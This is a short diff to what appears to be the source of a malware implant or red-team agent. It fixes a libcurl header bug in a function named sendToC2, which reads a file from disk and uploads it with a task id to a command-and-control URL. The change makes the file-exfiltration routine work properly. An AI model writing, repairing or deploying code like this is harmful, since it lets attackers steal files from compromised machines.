@@ -14,8 +14,8 @@ using namespace std;
 //https://stackoverflow.com/questions/38320819/c-curl-send-mulipart-form-data-file-to-webserver
 void sendToC2(string path, string url, string filename, string taskid) {
 	struct curl_slist* headers = NULL;
-	string s = "id=" + taskid;
-	curl_slist_append(headers, s.c_str());
+	string s = "id:" + taskid;
+	headers = curl_slist_append(headers, s.c_str());
 	std::string contents;
 	std::ifstream in(path, std::ios::in | std::ios::binary);
 	if (in)
